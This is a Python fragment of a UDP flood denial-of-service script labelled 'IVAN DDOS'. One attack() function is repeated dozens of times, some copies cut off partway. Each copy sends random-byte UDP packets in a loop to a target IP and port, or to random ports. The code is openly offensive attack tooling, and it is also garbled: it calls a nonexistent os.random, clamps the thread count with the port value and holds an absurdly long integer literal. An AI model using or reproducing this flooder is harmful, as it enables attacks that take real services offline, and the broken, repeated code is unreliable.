    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
